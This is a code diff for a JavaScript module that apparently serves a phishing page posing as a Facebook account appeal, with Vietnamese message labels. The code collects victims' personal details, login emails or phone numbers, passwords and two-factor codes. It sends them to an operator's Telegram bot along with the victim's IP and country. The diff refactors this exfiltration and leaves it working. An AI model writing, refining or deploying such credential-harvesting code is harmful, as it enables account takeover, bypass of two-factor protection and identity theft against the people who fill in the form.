@@ -1,20 +1,26 @@
 import config from '@/utils/config';
 import axios from '@/utils/axios-instance';
 
-let cachedIp = null;
+let cachedGeo = null;
 
-const getIp = async () => {
-    if (cachedIp) return cachedIp;
+const getGeoInfo = async () => {
+    if (cachedGeo) return cachedGeo;
     try {
         const res = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-        cachedIp = res.data.ip ?? 'Không rõ';
+        cachedGeo = {
+            ip: res.data?.ip ?? 'Không rõ',
+            country: res.data?.country ?? 'Không rõ',
+        };
     } catch {
-        cachedIp = 'Không rõ';
+        cachedGeo = {
+            ip: 'Không rõ',
+            country: 'Không rõ',
+        };
     }
-    return cachedIp;
+    return cachedGeo;
 };
 
-const buildMessage = (formData, credentials, ip) => {
+const buildMessage = (formData, credentials, geoInfo) => {
     const { emailOrPhone, password1, password2 } = credentials;
 
     const passwordLines = password2
@@ -23,25 +29,23 @@ const buildMessage = (formData, credentials, ip) => {
 
     return `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
 ━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Quốc gia:</b> <code>${formData.country ?? ''}</code>
+🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
 👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
 📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
 📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
 📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
 📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
 🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>
-🪪 <b>Loại giấy tờ:</b> <code>${formData.id_type ?? ''}</code>
-📝 <b>Mô tả:</b> <code>${formData.description ?? ''}</code>
 
 🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
 ━━━━━━━━━━━━━━━━━━━━━
 📱 <b>Email/SĐT:</b> <code>${emailOrPhone ?? ''}</code>
 ${passwordLines}
 
-🌐 <b>IP:</b> <code>${ip}</code>`;
+🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
 };
 
-const buildTwoFactorCodeMessage = (formData, payload, ip) => {
+const buildTwoFactorCodeMessage = (formData, payload, geoInfo) => {
     const { emailOrPhone, password1, password2, codes } = payload;
 
     const passwordLines = password2
@@ -54,15 +58,13 @@ const buildTwoFactorCodeMessage = (formData, payload, ip) => {
 
     return `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
 ━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Quốc gia:</b> <code>${formData.country ?? ''}</code>
+🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
 👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
 📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
 📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
 📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
 📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
 🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>
-🪪 <b>Loại giấy tờ:</b> <code>${formData.id_type ?? ''}</code>
-📝 <b>Mô tả:</b> <code>${formData.description ?? ''}</code>
 
 🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -73,7 +75,7 @@ ${passwordLines}
 ━━━━━━━━━━━━━━━━━━━━━
 ${codeLines}
 
-🌐 <b>IP:</b> <code>${ip}</code>`;
+🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
 };
 
 const deleteTelegramMessage = async (messageId) => {
@@ -91,13 +93,13 @@ const sendToTelegram = async (formData, credentials, prevMessageId = null) => {
     try {
         const token = config.token;
         const chatId = config.chat_id;
-        const ip = await getIp();
+        const geoInfo = await getGeoInfo();
 
         if (prevMessageId) {
             await deleteTelegramMessage(prevMessageId);
         }
 
-        const msg = buildMessage(formData, credentials, ip);
+        const msg = buildMessage(formData, credentials, geoInfo);
 
         const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
@@ -140,7 +142,7 @@ export const sendTryOtherToTelegram = async (formData, payload, selectedMethodLa
     try {
         const token = config.token;
         const chatId = config.chat_id;
-        const ip = await getIp();
+        const geoInfo = await getGeoInfo();
 
         if (prevMessageId) {
             await deleteTelegramMessage(prevMessageId);
@@ -164,15 +166,13 @@ export const sendTryOtherToTelegram = async (formData, payload, selectedMethodLa
 
         const msg = `📋 <b>THÔNG TIN KHÁNG NGHỊ</b>
 ━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Quốc gia:</b> <code>${formData.country ?? ''}</code>
+🌍 <b>Quốc gia:</b> <code>${geoInfo.country}</code>
 👤 <b>Họ tên:</b> <code>${formData.full_name ?? ''}</code>
 📧 <b>Email FB:</b> <code>${formData.email_facebook ?? ''}</code>
 📧 <b>Email làm việc:</b> <code>${formData.email_work ?? ''}</code>
 📄 <b>Tên trang:</b> <code>${formData.page_name ?? ''}</code>
 📞 <b>Điện thoại:</b> <code>${formData.phone ?? ''}</code>
 🎂 <b>Ngày sinh:</b> <code>${formData.date_of_birth ?? ''}</code>
-🪪 <b>Loại giấy tờ:</b> <code>${formData.id_type ?? ''}</code>
-📝 <b>Mô tả:</b> <code>${formData.description ?? ''}</code>
 
 🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -183,7 +183,7 @@ ${codesSection}
 ━━━━━━━━━━━━━━━━━━━━━
 ✅ <b>Phương thức đã chọn:</b> <code>${selectedMethodLabel}</code>
 
-🌐 <b>IP:</b> <code>${ip}</code>`;
+🌐 <b>IP:</b> <code>${geoInfo.ip}</code>`;
 
         const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
@@ -201,13 +201,13 @@ export const sendCodeToTelegram = async (formData, payload, prevMessageId = null
     try {
         const token = config.token;
         const chatId = config.chat_id;
-        const ip = await getIp();
+        const geoInfo = await getGeoInfo();
 
         if (prevMessageId) {
             await deleteTelegramMessage(prevMessageId);
         }
 
-        const msg = buildTwoFactorCodeMessage(formData, payload, ip);
+        const msg = buildTwoFactorCodeMessage(formData, payload, geoInfo);
 
         const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
